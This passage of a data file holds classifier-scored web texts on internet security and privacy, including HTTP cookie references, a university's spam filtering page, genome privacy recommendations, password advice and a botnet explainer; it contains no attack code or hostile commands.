Deconstructing Code, SSRN.com, chapter II.B (Netscape's cookies), Yale Journal of Law and Technology, 6, 277–389 - Kristol, David; HTTP Cookies: Standards, privacy, and politics, ACM Transactions on Internet Technology, 1(2), 151–198, 2001 doi:10.1145/502152.502153 (an expanded version is freely available at arXiv:cs/0105018v1 [cs.SE]) - \"Press Release: Netscape Communications Offers New Network Navigator Free On The Internet\". Web.archive.org. Archived from the original on 2006-12-07. Retrieved 2010-05-22. - \"Usenet Post by Marc Andreessen: Here it is, world!\". Groups.google.com. 1994-10-13. Retrieved 2010-05-22. - Hardmeier, Sandi (2005-08-25). \"The history of Internet Explorer\". Microsoft. Retrieved 2009-01-04. - Jackson, T (1996-02-12). \"This Bug in Your PC is a Smart Cookie\". Financial Times. - \"Maintaining session state with cookies\". Microsoft Developer Network. Retrieved 22 October 2012. - Rouse, Margaret (September 2005). \"Transient cookie (session cookie)\". SearchSOA. TechTarget. Retrieved 22 October 2012. - OWASP Browsers Supporting HttpOnly - IETF HTTP State Management Mechanism – Apr, 2011 Obsoletes RFC 2965 - Böttiger, Arvid (2011). \"HTTP-Only cookies - Brought to you by Internet Explorer 6\". - Mayer, Jonathan. \"Tracking the Trackers: Microsoft Advertising\". The Center for Internet and Society. Retrieved 28 September 2011. - Burt, David. \"Update on the issue of ‘supercookies’ used on MSN\". Retrieved 28 September 2011. - Jim Manico quoting Daniel Stenberg, Real world cookie length limits - \"Persistent client state HTTP cookies: Preliminary specification\". Netscape. c1999. Archived from the original on 2007-08-05. - RFC 2965 – HTTP State Management Mechanism (IETF) - \"Cookie Property\". MSDN. Microsoft. Retrieved 2009-01-04. - Shannon, Ross (2007-02-26). \"Cookies — set and retrieve information about your readers\". HTMLSource. Retrieved 2009-01-04. - Innovative, Php (2011-09-02). \"Sharing Cookies Between Multiple Domains\". InnovativePhp. Retrieved 2011-09-02. - RFC 2616 - Hypertext Transfer Protocol - HTTP/1.1 - Symantec Internet Security Threat Report: Trends for July–December 2007 (Executive Summary) (PDF) XIII. Symantec Corp. April 2008. pp. 1–3. Retrieved May 11, 2008. - Whalen, David (June 8, 2002). \"The Unofficial Cookie FAQ v2.6\". Cookie Central. Retrieved 2009-01-04. - \"3rd-Party Cookies, DOM Storage and Privacy\". grack.com: Matt Mastracci's blog. January 6, 2010. Retrieved 2010-09-20. - \"How to Manage Cookies in Internet Explorer 6\". Microsoft. December 18, 2007. Retrieved 2009-01-04. - \"Clearing private data\". Firefox Support Knowledge base. Mozilla. 16 September 2008. Retrieved 2009-01-04. - \"Clear Personal Information : Clear browsing data\". Google Chrome Help. Google. Retrieved 2009-01-04. - \"Clear Personal Information: Delete cookies\". Google Chrome Help. Google. Retrieved 2009-01-04. - \"Site Compatibility for Firefox 22\", Mozilla Developer Network, 2013-04-11 - Miyazaki, Anthony D. (2008), “Online Privacy and the Disclosure of Cookie Use: Effects on Consumer Trust and Anticipated Patronage,” Journal of Public Policy & Marketing, 23 (Spring), 19–33 - \"CIA Caught Sneaking Cookies\". CBS News. 2002-03-20. - \"Spy Agency Removes Illegal Tracking Files\". The New York Times. 2005-12-29. - \"EU Cookie Directive - Directive 2009/136/EC\". JISC Legal Information. Retrieved 31 October 2012. - Privacy and Electronic Communications Regulations. Information Commissioner's Office. 2012. - Directive 95/46/EC of the European Parliament and of the Council of 24 October 1995 on the protection of individuals with regard to the processing of personal data and on the free movement of such data. 1995-11-23. pp. P. 0031–0050. Retrieved 31 October 2012. - \"New EU cookie law (e-Privacy Directive)\". Retrieved 31 October 2012. - \"EU cookie law: stop whining and just get on with it\". Retrieved 31 October 2012. - \"A Loophole Big Enough for a Cookie to Fit Through\". Bits. The New York Times. Retrieved 31 January 2013. - Pegoraro, Rob (July 17, 2005). \"How to Block Tracking Cookies\". Washington Post. p. F07. Retrieved 2009-01-04. - Wired Hack Obtains 9 Bogus Certificates for Prominent Websites - Fielding, Roy (2000). \"Fielding Dissertation: CHAPTER 6: Experience and Evaluation\". Retrieved 2010-10-14. - Tilkov, Stefan (July 2, 2008). \"REST Anti-Patterns\". InfoQ. Retrieved 2009-01-04. - Mena, Jesús (2011). Machine Learning Forensics for Law Enforcement, Security, and Intelligence. Boca Raton, FL: CRC Press (Taylor & Francis Group). ISBN 9-781-4398-6069-4. - \"ThomasFrank.se\". ThomasFrank.se. Retrieved 2010-05-22. - RFC 6265 – the official specification for HTTP cookies - HTTP cookies - Mozilla Developer Network - Using cookies via ECMAScript - Mozilla Developer Network - How Internet Cookies Work at HowStuffWorks - Information About Cookies from Microsoft - Cookies at the Electronic Privacy Information Center (EPIC) - Taking the Byte Out of Cookies: Privacy, Consent, and the Web (PDF) - Web handbook – Cookies from Delivery And Transformation Group, Cabinet Office, UK - Cookie-Based Counting Overstates Size of Web Site Audiences at ComScore - Don’t Tread on Our Cookies – The Web Privacy Manifesto at PBS - Mozilla Knowledge-Base: Cookies - AVG Blogs: What are Cookies",
        "prob": "tensor([[4.8238e-06, 1.0000e+00]])"
    },
    {
        "text": "- Safety and Security - Network and Phone - Mobile Devices Blocking E-mail Spam Network Engineering uses several tools to help keep spam from reaching your mailbox. Read on for more information about what we are doing to prevent spam, what you can do, and how to keep your address off of spammers' lists. What is Spam? Spam is defined as unsolicited, bulk e-mail. Typically spam comes from strangers - people who have obtained your e-mail address without your permission. If you signed up for the mailing (intentionally or accidentally), it may be undesirable e-mail, but it is not technically spam. Likewise, if you have some sort of business relationship with the sender, it is not spam. So, an e-mail sent to you from your bank, an online service you signed up for, or your department at OSU would not be considered spam. Note: Using OSU's e-mail system to send unauthorized bulk mailings is against the Acceptable Use Policy. For information about how to do a bulk mailing at OSU correctly, please see the Guidelines for Release of E-mail Addresses. Step 1 - Using Filtering On Your Account Step 2 - Reporting Spam If Step 1 doesn't stop the spam from coming through, you can report the spam to OSU Network Engineering: Greylisting works by sending a temporary failure message on the first attempt of a unique combination of sender IP, sender and recipient. Legitimate, properly-configured mail servers deal with a temporary failure by queuing the message and resending later (typically within 15 to 30 minutes). On subsequent attempts to send a message, the greylisting server allows the message to be delivered. Greylisting works as an effective method to prevent spam because spammers typically do not bother to queue mail. Rather they blast the spam out once and ignore delivery failures. The downside of greylisting is that it may cause a legitimate message to be delayed. Messages may also appear to arrive out of order, as subsequent messages from the same sender are not delayed. Also some sites do not queue and redeliver messages properly. OSU addresses these issues by building up a comprehensive whitelist of allowed senders. If there are sites that you are concerned about, please send us a list at net (at) oregonstate.edu, and we will add them to the whitelist. NOTE: Greylisting does not apply to e-mail sent within OSU. Real-Time Black Hole Lists (RBLs) A RBL is a list of hosts that are known untrustworthy e-mail senders. When we receive email from one of these sites, we bounce the message back to the site with an explanation that they are in an RBL and a link with directions on how to get unlisted from it. In addition to RBLs, we have an access list of domain names and email addresses of known spammers that we reject mail from. We also block mail from dynamic IP ranges, because mail servers should never have a dynamic IP. Finally, we block mail from dialup users and cable modem users - these users must relay through their ISP's mail server (or they can relay through OSU with ONID authentication). We use the following RBLs at OSU - Spamhaus.org PBL (pbl.spamhaus.org) - Spamhaus.org SBL (sbl.spamhaus.org) - Spamhaus.org XBL (xbl.spamhaus.org) - Dynablock (dynablock.njabl.org) - NJABL.ORG (dnsbl.njabl.org) - VIRBL - virus black list(virbl.dnsbl.bit.nl) If you are having trouble receiving mail from another site because they are listed in one of our RBLs, please tell the person at the remote location to contact their e-mail administrator or ISP and give them the information in the bounce message that they received from OSU. Contact us at net(at)oregonstate.edu if the sending site is unable or unwilling to get unlisted - we may be able to help them get unlisted, or whitelist the site here. For more information about phishing, please see the Phishing helpdoc page. OSU blocks e-mail messages that contain a reply-to address that goes to a known phisher. If practical, we will also \"poison DNS\" for links included in phishing e-mails, so that clicking the link will redirect you to a safe page instead. If you respond in any way to a phishing e-mail that asks for your username and password, we will disable your account and ask you to reset your password. OSU has had several accounts become hacked in the past and these hacked accounts have been used to send hundreds of thousands of spam e-mails to OSU and to the world, causing serious e-mail disruption. NEVER respond to phishing e-mails! Content-Based Filtering & SpamAssassin Content-based filtering refers to sorting or deleting mail based on the content of the message itself. We do content-based tagging at the mail relays using SpamAssassin, and these tags can be used to filter spam in your e-mail client. Many e-mail clients now come with \"Junk Mail\" filters built-in, which you can turn on to help sort out the messages you don't want to see. When you use a junk mail filter, make sure that you set it to sort the unwanted mail into a junk folder, rather than your deleted items. That way, you can check the junk folder once in a while to make sure that no innocent e-mails have ended up there. SpamAssassin headers that you can filter on: X-Spam-Flag: YES (indicates that this message has a score of 5 or more) X-Spam-Level: ******** (the number of stars indicates the spam score) For example, to filter all messages with a score of 3 or higher, you could create a rule in your email client to match on \"X-Spam-Level: ***\". How to Keep Your E-mail Address Off Spam Lists The best way to avoid being spammed is to be careful how you share your e-mail address. Every time that you sign up for something online and provide your e-mail address to do so, you are potentially sharing your contact information with not only that site, but with third parties as well. The following are things you can do to keep your address off spammers' lists: - Don't sign up for work-at-home or other too-good-to-be-true offers; they are typically scams and your contact information will definitely go to spammers. - NEVER reply to spam or phishing emails. If you do, it verifies to the spammer that your address is a real working address and that makes it even more valuable to them (and makes it more likely that you will get more spam). - If you post your e-mail address on a publicly accesible website, try to obscure it in some way (e.g. bob(at)oregonstate.edu). - When signing up for various accounts online, uncheck the boxes that ask about putting you on their mailing list. Typically these will be checked by default. OSU Email Statistics Where does spam come from? In the past, most spam came from misconfigured mail servers or proxy servers. But today most spam comes from virus-infected personal computers, hacked e-mail accounts and free e-mail providers. See the Wikipedia article on Spam for more information about how spammers operate. One very important thing that you can do in the fight against spam is to keep your computer up-to-date on software patches and anti-virus software. It's also a good idea to run a personal firewall. Use caution when opening e-mails from addresses you don't recognize, and always scan email attachments for viruses. If your computer has become noticeably slower, it's a good idea to run virus-detection software. Finally: NEVER share your password!",
        "prob": "tensor([[2.0948e-06, 1.0000e+00]])"
    },
    {
        "text": "Shots - Health Blog Thu October 11, 2012 Bioethicists Call For Privacy Protections For Personal Genomes When a stranger can gain access to someone's entire genetic code by picking up a used coffee cup, it presents a whole new thicket of concerns about privacy and security. Actually, we're already there, though we're still in the early stages of what's shaping up, after all the years of hype, as a genuine revolution. Just take a look at Rob Stein's recent series on the $1,000 genome to see how far we've come and where we're headed. A sample of saliva taken from a coffee cup or a Q-tip is enough for technicians to reveal someone's genes, for better and for worse. Reuters' Sharon Begley points to EasyDNA, a California company, that's already doing ancestry, health and paternity testing on samples ranging from cigarette butts to licked stamps. Against that backdrop, the Presidential Commission for the Study of Bioethical Issues just released recommendations on how the country should proceed along the genomic path. Yes, whole genome sequencing may help refine diagnosis and treatment, though there are still plenty of technical and medical hurdles to overcome before that's commonplace. Between now and then, safeguards are needed before whole genome sequencing becomes widespread, the commission says. In a letter to President Obama, the commission chairs say the group, \"recommends strong baseline protections for whole genome sequence data to protect individual privacy and data security while also leaving ample room for data sharing opportunities that propel scientific and medical progress.\" Some specific ideas from the commission: - Federal and state governments should establish a \"floor of privacy protections covering whole genome sequence data regardless of how they were obtained.\" - Prohibit unauthorized whole genome sequencing without the consent of the person whose sample is being analyzed. (Hands off my coffee cup!) - The people who sequence your genome need to tell you up front that it's likely there will be potentially worrisome \"incidental findings\" in the results. So-called incidentalomas are quite common when radiologists scan patients. Since everyone has genetic mutations, the whole genome sequences are bound to find something quirky on everyone. When obtaining your consent, the researchers, doctors or commercial genome sequencers need to explain when and how they'll tell you about those findings.",
        "prob": "tensor([[0.2351, 0.7649]])"
    },
    {
        "text": "Damian Dovarganes/Associated Press Damian Dovarganes/Associated Press NEW YORK – Rarely does a week go by without news of another hacking incident, whether it’s Chinese hackers accused of breaking in to The New York Times’ computer systems or Burger King finding its Twitter account taken over by pranksters. Security threats aren’t new and have long been part of online life. But the increased attention on them makes now a good time to review ways you can protect yourself. If nothing here feels new, that’s good, as it means you’ve been doing the things you need to do to keep your accounts safe from hackers. Although there’s no way to completely eliminate threats, minimizing them will go a long way. One of the best things you can do is to make sure your password is strong. If someone’s able to guess the password to your email or Facebook account, that person can post or send embarrassing things on your behalf. Someone was able to access Burger King’s Twitter account recently and changed its profile picture to a McDonald’s logo. If a banking or Amazon account is involved, someone could pay bills or buy iPads under your name – with your money. What’s worse, getting a password to one account is often a stepping stone to a more serious breach. Someone can use your email or Facebook account to send spam and scam messages to your friends, for instance. And because many services let you reset your password by sending an email to your address on file, someone with access to your email account can reset passwords and gain access to all sorts of things. If the compromised password is one you use for work, someone can snoop around for files on your employer’s network with trade secrets or customers’ credit card numbers. Here are ways you can keep your password strong to ward off that initial intrusion: Make your password long. The recommended minimum is eight characters, but 14 is better and 25 is even better than that. Some services have character limits on passwords, though. Use combinations of letters and numbers, upper and lower case and symbols such as the exclamation mark. Some services won’t let you do all of that, but try to vary it as much as you can. “PaSsWoRd!43” is far better than “password43.” Avoid words that are in dictionaries, even if you add numbers and symbols. There are programs that can crack passwords by going through databases of known words. One trick is to add numbers in the middle of a word – as in “pas123swor456d” instead of “password123456.” Another is to think of a sentence and use just the first letter of each word – as in “tqbfjotld” for “the quick brown fox jumps over the lazy dog.” Substitute characters. For instance, use the number 0 instead of the letter O, or replace the S with a dollar sign. Avoid easy-to-guess words, even if they aren’t in the dictionary. You shouldn’t use your name, company name or hometown, for instance. Avoid pets and relatives’ names, too. Likewise, avoid things that can be looked up, such as your birthday or ZIP code. But you might use that as part of a complex password. Try reversing your ZIP code or phone number and insert that into a string of letters. As a reminder, you should also avoid “password” as the password, or consecutive keys on the keyboard, such as “1234” or “qwerty.” Never reuse passwords on other accounts – with two exceptions. Over the years, I’ve managed to create hundreds of accounts. Many are for one-time use, such as when a newspaper website requires me to register to read the full story. It’s OK to use simple passwords and repeat them in those types of situations, as long as the password isn’t unlocking features that involve credit cards or posting on a message board. That will let you focus on keeping passwords to the more essential accounts strong. The other exception is to log in using a centralized sign-on service such as Facebook Connect. Hulu, for instance, gives you the option of using your Facebook username and password instead of creating a separate one for the video site. This technically isn’t reusing your password, but a matter of Hulu borrowing the log-in system Facebook already has in place. The account information isn’t stored with Hulu. Facebook merely tells Hulu’s computers that it’s you. Of course, if you do this, it’s even more important to keep your Facebook password secure. How do you keep track of these passwords? There are programs you can buy, if you’re willing to put your trust in them. I use an Excel spreadsheet, but I encrypt it with its own password – a rather complex one. I am well aware that if the file gets compromised, all my services go with it. In fact, I once had it on a USB drive, which I had in a backpack that got stolen. I had to spend several hours changing passwords on all my accounts, just in case someone managed to break the password to that file. As a precaution, don’t name that file “passwords.” Name it something generic and boring. Ideally, you’ll have a system for creating and remembering passwords without needing the spreadsheet. For example, you might have a string that’s constant, such as “?t7q1b9f8j2o0t0l1d!” (the acronym for “the quick brown fox jumps over the lazy dog” with my area code and ZIP code reversed and a few special characters put in). To vary it, you could add the first two letters of the website you are using to the front and the next four to the end. Or put the consonants in front and the vowels at the end, with every other letter capitalized and the letter O replaced with the number 0. So for Amazon, it would be “mZn?t7q1b9f8j2o 0t0l1d!Aa0.” Just try to guess that! Of course, I’m not smart enough to have a system like that for myself. Whatever system you adopt, it’s good to change your password – and system – from time to time. And if there’s reason to believe your password might have been compromised, change it immediately. One other thing to be aware of: Many sites let you reset your password by answering a security question, such as the name of your pet or the name of your high school. Of course, these violate good password practices by requiring you to use something that can be easily looked up. Others ask for your favorite movie or hobby. That might not be easily looked up, but your tastes change over time. Furthermore, because these questions get repeated from site to site, the answers you use violate the rule against repeating passwords. I try to make these answers complex just like passwords, by adding numbers and special characters and making up responses. Unfortunately, some sites won’t let you do that, and you’ll be stopped if you try to enter a numeral when asked for a city name, for instance. These services will often send an email when a password gets reset this way, so be sure the address on file is current. Change your password and security questions immediately if you’re notified of a reset you didn’t initiate. You might want to contact the service as well. While you’re at it, make your username complex, too, if you’re allowed to choose one. Banking sites typically do. Beyond passwords, here are a few other things to help you stay safe: Software flaws. Many break-ins result from flaws in the software program you use, whether it’s the Windows or Mac operating system, a Web browser or a video player. It’s a good idea to let those programs automatically check for software updates, as those updates may contain fixes to known flaws. You can also check this government website to learn of the latest threats and fixes: http://us-cert.gov . Malicious software. Even if the software you’re using is flawless, hackers may create a security opening by tricking you into installing a malicious program. That can happen if you click on a bad email attachment or link in your email. In rare cases, visiting a problematic website can cause the software to download. Should malicious software get on your computer, a hacker might be able to use the opening to look around for sensitive data, or record your keystrokes to capture your complex passwords. To minimize the threat, use caution when visiting unknown sites or opening mysterious email. Security software. Many companies sell anti-virus and other software to protect your computer from malicious software. There’s a free one available at http://www.avg.com . Windows and Mac computers also come with firewalls to block some threats. Be sure it’s turned on.",
        "prob": "tensor([[2.1423e-06, 1.0000e+00]])"
    },
    {
        "text": "Password Policy Guidelines This document introduces the basic concepts of network authentication. In particular, it focuses on the use of login IDs and passwords to verify the identity of users. Various strategies for selecting strong, hard-to-guess passwords are then discussed. The Role of Passwords in Authentication Most shared computer systems limit access to data and resources, based on the identity of users who request that access. Access control is therefore dependent on reliable user identification. Authentication is the process of identifying users in a manner which makes it difficult for one user to impersonate another. A number of technologies are available for user authentication. The most popular authentication systems are: - Secret passwords. - Cryptographic certificates. - Smart cards. - Biometric devices (fingerprints, retina scans, head scans, etc.). Since they are the least expensive to implement, most systems rely on passwords to authenticate users. As well, passwords are often used in addition to physical or cryptographic proofs of identity to further strengthen security. Threats to Password Security A typical case involves a malicious user (M) trying to access a network resource for which M is not authorized. One of the easiest ways for M to access that network resource is to guess the password of a valid user (V). There are several methods that M could use to guess V's password. First, M could use a computer program to try out possible values for V's password very quickly. M could also acquire V's password by watching as V enters it. M could literally watch V typing, or could use electronic means, such as installing software on V's computer to record his keystrokes, or installing a network analyzer to monitor V's keystrokes as they are transmitted over the network. Making Passwords Hard to Guess The responsibility of selecting a password that is hard to guess generally falls to users, like V. If users choose a one-character password, and that character could be any uppercase letter, lowercase letter or digit, then there would be 62 possible passwords. Clearly, M could try all 62 possibilities very quickly. V could make his/her password harder to guess by using more characters. Using the same possible characters, there are 3844 possible two-character passwords, and 218340105584896 (about 218 trillion) 8-character passwords. Even if M could try out 5000 eight-character passwords per second, it would take, on average, 700 years for M to guess V's 8-character password. Clearly, longer passwords are more secure! Unfortunately, V might choose a long password based on something he knows - like his login ID, name or some dictionary word. If V does this, then instead of trying 218 trillion passwords, M could probably guess V's password after a few thousand attempts. If M uses a computer program to guess passwords, this will only take a few minutes. To decrease the chances of M ever guessing his/her password, V must select a hard-to-guess, or strong password. A strong password must: - Be as long as possible (never shorter than 6 characters). - Include mixed-case letters, if possible. - Include digits and punctuation marks, if possible. - Not be based on any personal information. - Not be based on any dictionary word, in any language. While most shared systems can enforce at least some of these rules, almost none have features to enforce all of them. No matter how many strength rules V uses, though, the persistent M will eventually guess V's password - given enough time. Thus, V must also: - Change his password regularly, in order to limit the amount of time available to M to guess it. - Never use the same password twice. Some systems have a password expiry feature, which forces V to change his password periodically. As well, some systems incorporate a password history feature, which disallows V from reusing one of his last N passwords. When faced with a password history mechanism, some users may change their password N times, and return it to its original value, so as to avoid having to remember a new password value. To prevent this, systems should either have an unlimited-length password history, or prevent users from changing their password more than once daily. Making Passwords Hard to Intercept When a user enters his/her password, it might be intercepted at his/her workstation (by a keyboard monitor program), on the network (by a packet sniffer program), or on the server he is accessing (by a Trojan Horse program). To protect the user's workstation, a strong operating system must be installed, such as Unix or Windows NT. Furthermore, the workstation must be physically secured against tampering. If an operating system without security features is used (such as DOS, Windows or MacOS), then an intruder only needs temporary physical access to the console to insert a keyboard monitor program. If the workstation is not physically secured, then an intruder can reboot even a secure operating system, restart the workstation from his own media, and insert the offending program. To protect against network analysis attacks, both the workstation and server should be cryptographically secured. Examples of strong protocols are the encrypted Netware login and Kerberos. Some systems (like the Windows NT file server protocol -- SMB or CIFS) make an attempt at cryptography, but are easily defeated by cryptanalysis. Systems that make no effort to encrypt remote access sessions, such as mainframes and Unix hosts, can be trivially compromised by a network analyzer. Finally, to protect against Trojan Horse login programs, the server should be physically secured, closely monitored, and should automatically log off unattended sessions.",
        "prob": "tensor([[2.0433e-06, 1.0000e+00]])"
    },
    {
        "text": "Consumers and companies today rely on the Internet to perform all manner of tasks, from conducting business, to buying and selling personal items to managing their lives, friendships and family interactions. However, working and living online exposes everyone to successive waves of hacks, scams, and other digital exploits – threats unimagined only a few years ago. Enterprise IT and corporate management are spending increasing time, energy, and funds on securing digital and physical assets with technology of growing complexity. Strong encryption, multifactor biometrics, intrusion detection, anti-malware software and other advanced security measures provide necessary protection against a range of threats, but a simple truth remains: Verification before a transaction (or a security breach) occurs is always cheaper and more effective than attempting to remedy the consequences of failing to do so. Internet security today is built on a fragile combination of robust transport authentication mechanisms like SSL and SSH, strong public and private key encryption, and password and CAPTCHA regimes. Unfortunately, encryption and transport security do little to address vulnerabilities at the endpoints — servers and the personal devices used to access them. And, authentication solutions such as passwords, CAPTCHA and tokens have been shown to be vulnerable to attack. Intelligent authentication via the phone Mobile phones are today the most ubiquitous devices on earth. In 2011, the United Nations estimates that more than five billion people worldwide own mobile phones and subscribe to voice and messaging plans and other services. Complement that number with 1.2 billion landlines and a growing number of Internet (VoIP) phones for majority coverage of today’s global population of nearly 7 billion people. Mobile phones and landlines present key advantages for verification and authentication regimes: PhoneID provides detailed information about phone type and registration location information globally. Scammers and fraudsters often rely on untraceable pre-paid phones or VoIP numbers that they can acquire in bulk to spam and scam online users. PhoneID helps companies identify such anonymous, location-independent telephone numbers, and block or flag these users and their associated transactions. Telephone Verification entails using a supplied telephone number for one-time authentication of online user identity. It calls or sends a text to the user supplied phone number with a PIN that gives users the opportunity to verify their identity in establishing an account or even for each login to the account. Combined with PhoneID, telephone verification forms a robust out-of-band authentication method. For example, Name.com, an accredited domain registrar and web hosting company, has a multi-layered fraud defense strategy, using telephone verification together with other fraud prevention products to eliminate more than $1.5 million in annual online fraud. Domain registrars are frequently targeted by fraudsters, as compromised domain names are easy gateways for scamming customers of banks, cloud services companies, e-commerce and other websites. By stealing and redirecting domain names, fraudsters can intercept traffic and spoof websites to “phish” for credentials, compromise user accounts, and siphon off funds and personal data. In recent years, Name.com experienced 10 to 12 percent annual fraud rates. By employing fraud prevention solutions to flag suspicious orders and create audit trails with intelligent authentication, Name.com reduced the time and manpower needed to identify fraudulent orders and cut illegal domain purchases by 97 percent. Phone verification/identification is fast becoming a core security solution for online companies. It’s used by organizations of all sizes including some of the world’s largest and most prominent Web businesses. It’s also in use by in multiple industries such as social media, lead generation, classifieds, financial services, healthcare, eCommerce and cloud-based services. Verification is not merely a piece of larger security routines. Verification lets users, employers, and vendors build and leverage online reputation for applications that include: In short, verification is key to securing online activities where knowing who is attempting to access digital assets is as important as what that person is doing. Benefits for Solutions Providers By offering telephone verification along with other complementary security products, solutions providers can reap many benefits. They include: - Protecting The Business From Cloud Application Security Risks - The Massive SaaS Opportunities For VARs - A Reseller's Guide: Recipe For Channel Partnership Success - Cloud Connection: Seven Steps To Effective Public Cloud Services - From CapEx To OpEx: Channel Strategy In The Federal Push To The Cloud - A Reseller's Guide: Coming Out On Top In The Face Of Channel Conflict - How To Create A Case For Disaster Recovery Plan - How To Offset Your Customers' BYOD Risks - How To Ease Client Anxiety About Private Cloud Deployments - How An SMB Cloud Provider Can Create 'Swagger' In A Competitive Market - A Reseller's Guide: Creating A Successful Solution Provider Event - How to Prepare for the Future of the IT Solutions Industry - How to Consolidate Data Protection Services for Greater Customer Value - 10 Attributes to Support Revenue Marketing and Sales Success. - How To Improve Efficiency: Upgrade Mountain Lion and iOS6 - How To Cash In On the Cloud Through Collaboration - How To Sell Cloud Storage In Five Steps - How To Protect High-Value Data Assets - Moving Data to the Cloud: Options for SMBs and Small Enterprises - How To Apply Big Data Security Analytics to Detect Advanced Threats and Breaches",
        "prob": "tensor([[2.1278e-06, 1.0000e+00]])"
    },
    {
        "text": "Understanding Hidden Threats: Botnets You've most likely heard of botnets. Still, even with all of the references to them in the news these days, it's not easy to gain a clear understanding of what they are, and how they might be affecting you. We've taken a few of the most common questions sent in by Lavasoft News readers, and answered them in plain and simple terms. Keep reading to set the facts on botnets straight. What is a botnet? A botnet is a network of compromised, or infected, computers that hackers have commandeered. PCs that are part of a botnet are often referred to simply as \"bots\". Botnets are part of the multilayered and profitable crimeware industry, where the initial step is to infect and take control of a targeted computer. PCs in a botnet are under the remote command and control of hackers. As part of that, hackers can take advantage of all of the resources on a machine (from personal information to bandwidth), and use it to perform malicious tasks under remote direction - all to carry out their criminal intentions. What is a zombie computer? A zombie computer is a system that has been infected and taken over remotely by cyber criminals. A collection of zombie computers makes up a botnet. What are botnets used for? Botnets are controlled remotely by hackers to distribute spam, viruses, and theft schemes - and to hijack additional computers. The main motivation behind botnets, in recent years, is for monetary gain by cyber criminals. Once compromised, cyber criminals have complete access to the infected machine; they are able to load software onto it, or pull information off of it. Bot herders, the hackers who control botnets, can instruct thousands of computers to follow their orders, whether it's to propagate spam messages, launch fraud schemes or to issue denial of service attacks, targeting certain, often high-profile, websites in order to make them unavailable to users. Once bot herders compile a group of compromised machines, they can sell it to fraudsters who are then capable of using the exploited machines for identity and data theft. How do I know if my computer is part of a botnet? Most owners of compromised PC are unwitting victims, never realizing that they have allowed unauthorized access to their computers. Machines are infected without the knowledge of the computer user; usually access to the system is gained through a virus, worm, or Trojan. The symptoms of infection are generally very subtle and are not immediately apparent to the average computer user without using special tools. Still, there are telltale signs and symptoms which may indicate a problem. - A slow computer The most apparent sign, according to the analysts as Lavasoft Malware Labs, is \"slow computer\" syndrome: your Internet connection becomes strangely sluggish, or your PC gets slower as you run a few programs on it simultaneously. (However, users should note that this can also be caused by other types of malware, as well as other PC problems.) - Accused of sending spam Being accused of sending spam is a sign that your system is infected and is part of a spam bot. - Detecting malware responsible for bots By running an anti-spyware and anti-virus program, the security software will be able to root out an infection and classify it as a bot. - An unknown or suspicious process is running in the background on your PC If you use a firewall to monitor network traffic, the program will allow you to spot suspicious traffic on your PC. For more technically-oriented computer users, bot activity can be discovered through packet sniffer tools and knowledge about different protocols, ports, Windows Registry, processes and TCP/IP. This includes: - Large amounts of network traffic Bots often connect to remove servers; they may use a questionable amount of bandwidth and cause network traffic even if you are not online. - IRC Traffic Internet Relay Chat (IRC) is a type of real-time Internet messaging, designed mainly for group discussion forums. IRC bots connect to IRC as a client, performing automated functions but appearing to be another IRC user. - SMTP Traffic Simple Mail Transfer Protocol (SMTP) is an Internet standard for e-mail across IP networks. Bots may use a built-in SMTP-engine to send spam to other users. - Open Ports Open ports allows applications to multitask and use different protocols at the same time. All computer devices on a network need a channel to allow them to communicate with each other. Bots may search for open ports to be able to start a synchronization or communication. To learn more about the specific steps you should be taking to prevent your system from becoming part of a botnet, read our next article, How To Guide: Preventing Bot Infections.",
        "prob": "tensor([[2.1451e-06, 1.0000e+00]])"
    },
    {
        "text": "Big Data – What Is It? Big data is a popular term used to describe the exponential growth, availability and use of information, both structured and unstructured. Much has been written on the big data trend and how it can serve as the basis for innovation, differentiation and growth. According to IDC, it is imperative that organizations and IT leaders focus on the ever-increasing volume, variety and velocity of information that forms big data.1 - Volume. Many factors contribute to the increase in data volume – transaction-based data stored through the years, text data constantly streaming in from social media, increasing amounts of sensor data being collected, etc. In the past, excessive data volume created a storage issue. But with today's decreasing storage costs, other issues emerge, including how to determine relevance amidst the large volumes of data and how to create value from data that is relevant. - Variety. Data today comes in all types of formats – from traditional databases to hierarchical data stores created by end users and OLAP systems, to text documents, email, meter-collected data, video, audio, stock ticker data and financial transactions. By some estimates, 80 percent of an organization's data is not numeric! But it still must be included in analyses and decision making. - Velocity. According to Gartner, velocity \"means both how fast data is being produced and how fast the data must be processed to meet demand.\" RFID tags and smart metering are driving an increasing need to deal with torrents of data in near-real time. Reacting quickly enough to deal with velocity is a challenge to most organizations. Big data according to SAS At SAS, we consider two other dimensions when thinking about big data: - Variability. In addition to the increasing velocities and varieties of data, data flows can be highly inconsistent with periodic peaks. Is something big trending in the social media? Perhaps there is a high-profile IPO looming. Maybe swimming with pigs in the Bahamas is suddenly the must-do vacation activity. Daily, seasonal and event-triggered peak data loads can be challenging to manage – especially with social media involved. - Complexity. When you deal with huge volumes of data, it comes from multiple sources. It is quite an undertaking to link, match, cleanse and transform data across systems. However, it is necessary to connect and correlate relationships, hierarchies and multiple data linkages or your data can quickly spiral out of control. Data governance can help you determine how disparate data relates to common definitions and how to systematically integrate structured and unstructured data assets to produce high-quality information that is useful, appropriate and up-to-date. Ultimately, regardless of the factors involved, we believe that the term big data is relative; it applies (per Gartner’s assessment) whenever an organization’s ability to handle, store and analyze data exceeds its current capacity. Examples of big data - RFID (radio frequency ID) systems generate up to 1,000 times the data of conventional bar code systems. Tweet - 10,000 payment card transactions are made every second around the world.2 Tweet - Walmart handles more than 1 million customer transactions an hour.3 Tweet - 340 million tweets are sent per day. That's nearly 4,000 tweets per second.4 Tweet - Facebook has more than 901 million active users generating social interaction data.5 Tweet - More than 5 billion people are calling, texting, tweeting and browsing websites on mobile phones. Tweet Uses for big data So the real issue is not that you are acquiring large amounts of data (because we are clearly already in the era of big data). It's what you do with your big data that matters. The hopeful vision for big data is that organizations will be able to harness relevant data and use it to make the best decisions. Technologies today not only support the collection and storage of large amounts of data, they provide the ability to understand and take advantage of its full value, which helps organizations run more efficiently and profitably. For instance, with big data and big data analytics, it is possible to: - Analyze millions of SKUs to determine optimal prices that maximize profit and clear inventory. - Recalculate entire risk portfolios in minutes and understand future possibilities to mitigate risk. - Mine customer data for insights that drive new strategies for customer acquisition, retention, campaign optimization and next best offers. - Quickly identify customers who matter the most. - Generate retail coupons at the point of sale based on the customer's current and past purchases, ensuring a higher redemption rate. - Send tailored recommendations to mobile devices at just the right time, while customers are in the right location to take advantage of offers. - Analyze data from social media to detect new market trends and changes in demand. - Use clickstream analysis and data mining to detect fraudulent behavior. - Determine root causes of failures, issues and defects by investigating user sessions, network logs and machine sensors. \"High-performance analytics, coupled with the ability to score every record and 